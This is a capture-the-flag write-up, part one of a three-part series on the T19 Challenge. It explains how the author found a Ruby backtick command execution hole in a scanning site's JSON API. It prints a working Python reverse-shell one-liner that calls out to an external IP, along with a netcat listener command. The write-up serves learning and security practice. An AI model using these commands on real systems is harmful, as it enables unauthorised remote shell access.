title: T19 Challenge (Part 1)
---

The T19 Challenge was hosted by [Twistlock Labs](https://www.twistlock.com/labs/) last week on [http://t19challenge.com/](http://t19challenge.com/).

> Welcome. 
>
> Our company developed a unique Linux binary called "cat". We recently discovered that our competitors from the Antivirus company VirusExpress are blocking our cat binary. It is now signed as a **virus**. Word is that you are a badass security researcher. We need you to **infilitrate their server** and **empty their database**.

There are 3 parts of varying difficulty to this challenge. The vulnerabilities may look simple, but are really challenging to exploit.

In summary, we are provided with a virus scanning [site](http://virus.express/), which we must exploit a **command injection vulnerability** to gain access to the server. After which, we could escalate priviledges by exploiting a **buffer overflow vulnerability**, in a setuid binary that acts as a client to the virus database. Finally, we gain root access by exploiting a **buffer overflow vulnerability** in the database service ran by the root user.

This post is about the getting the first flag of the challenge, by exploiting a command injection vulnerability in the virus uploading API. 

If you would like to skip this part, here are the links to [part 2][part2] and [part 3][part3].

### Recon
The target, [virus.express](http://virus.express/), has a simple interface, allowing a user to upload a binary and check whether it is a virus.

Viewing the source, I found an interesting `TODO` left by the devs.

```html
2. Add documentation on the experimental JSON API on /api
```

Opening [virus.express/api](http://virus.express/api) in the browser gives the following response.

```json
{"success":false,"response":"Please deliver something next time."}
```

### Exploring the API
To ease poking around with the API, I intercepted the request with Burp. Through trial and error, by changing from `GET` to `POST` request, adding a `Content-Type: application/json` header, and sending a dummy `{"hello": "world"}` as data, the following error page is returned.

![error][error-screenshot]

It looks like the program errored out at the line

`response = {:success=>true, :response=>(is_virus? body[:file][:hash], body[:file][:name], body[:cmd])}`

As this was ruby syntax, it looks like we are expected a JSON object with fields `cmd` and `file`, where `file` is another object consisting of fields `hash` and `name`. So, we can modify our data to be 

```json
{
    "cmd": "ls", 
    "file": {
        "hash": "hello", 
        "name": "hello"
    }
}
```

![hash-error][hash-error-screenshot]

Another error. But this time, it looks like really good information. In particular, we can see the following line

`` `#{cmd} "#{encoded}" "#{filename}"` ``

In ruby, putting backticks around a string is to execute it as a shell command. This means we got arbitrary code execution!

But before that, the error needs to resolved so that we can execute what we want. It turns out that the `hash` is being passed into `Z85rb.encode()`, which expects a string with length of a multiple of 4. A simple fix is to set both `hash` and `name` as empty strings, so that they do not interfere with our `cmd`.

### Getting a reverse shell
Interacting with the server by constantly changing the `cmd` field is not a good experience. A more convenient method is to spawn a reverse shell.

Unfortunately, as with usual production machines, this one does not have `netcat` installed, which is used most often when trying to create a reverse shell. Nevertheless, we can go through this [reverse shell cheat sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) and try the commands one by one.

In the end, the `python` one worked out for me.

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

I just need to run `nc -lvp 8000` on a VPS, send to /api `cmd` set as the command above, and I get a shell to the server as user `rubyist`.

In [part 2][part2], we exploit a buffer overflow in a setuid binary to escalate priviledges as `ben`.

Actually, I'm not sure if it is even right to say that there is a command injection vulnerability, since we don't need to tweak the input to execute our command.

If there is anything unclear, feel free to leave a comment below.
